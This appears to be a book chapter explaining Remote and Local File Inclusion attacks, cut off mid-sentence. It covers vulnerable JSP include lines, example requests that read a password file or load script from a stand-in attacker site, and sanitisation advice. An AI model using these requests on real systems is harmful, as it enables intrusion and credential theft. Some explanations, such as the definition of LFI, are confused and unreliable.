    ![image](d2d_images/chapter_title_above.png)


    # Chapter 28


    # Remote File Inclusion (RFI)


    ![image](d2d_images/chapter_title_below.png)


    RFI (remote file inclusion) is an attack that targets susceptibilities in web
    applications that reference external scripts dynamically. The goal of the attacker
    is to take advantage of an application’s referencing function to upload malware
    from a remote URL in a different domain. A successful RFI attacker can result
    in a site takeover, compromised servers, or information theft. LFI (local file
    inclusion) is like RFI. It is the uploading of infected files to servers through
    web browsers. Most of the time, these two are referenced together. Both allow
    for malware to be uploaded to a targeted server. The only difference is that LFI
    attacks take advantage of insecure functions in a local file upload. This allows
    for malicious attacks. Attackers are then able to upload malware directly to the
    compromised system instead of accessing it from a remote location through a compromised
    external referencing function (as in an RFI).


    Example of Remote File Inclusion


    To understand how an RFI penetration is executed, consider the following examples:
    A JSP with this code line: <jsp:include page=”<%=(String)request.getParmeter(“ParamName”)%>”>
    is manipulated using the following request: Page1.jsp?ParamName=/WEB-INF/DB/password.
    When this request is processed, the perpetrator can see the password content file.
    A web application with an import statement requesting URL content: <c:import url=”<=request.getParameter(“conf”)%>”>.


    If this statement is unsanitized, it can be used to inject malware.


    For instance: Page2.jsp?conf=https://evilsite.com/attack.js. Manipulation of request
    parameters making them refer to a remote file is also a method used to launch
    RFI attacks. 


    DIY Prevention and Mitigation of RFI


    Using proper sanitization and input validation, you can reduce the risks of an
    RFI attack.  When you choose to do this, however, you must bear in mind the fact
    that you cannot sanitize all user inputs completely. Because of this, you should
    use sanitization as a supplement to a better security solution. With that out
    of the way, it is always advisable to sanitize controlled/user-supplied inputs
    as thoroughly as possible. The inputs include:


    ●  HTTP header values


    ●  Cookie values


    ●  URL parameters


    ●  GET/POST parameters


    During the sanitization process, check input fields against a whitelist— the allowed
    set of characters— as opposed to a blacklist— malicious characters that are disallowed.
    Basically, blacklist validation is not a strong solution. A perpetrator can decide
    to give input in another format such as hexadecimal or encoded formats. Another
    great practice involves applying output validation mechanisms on the server end.
    Validation functions on the client side are also not immune to proxy tools attacks
    since they have the advantage of mitigating processing overhead. Lastly, restrict
    the permission of executing upload directories. Also, consider having a whitelist
    of the allowed types of files, for example, JPG, DOC, PDF, etc. and restrict the
    size of uploaded files. Proper file management and input sanitization practices
    are not enough when used on their own. Most attacks still happen because DIY practices
    encourage a false sense of security. Find other efficient solutions such as the
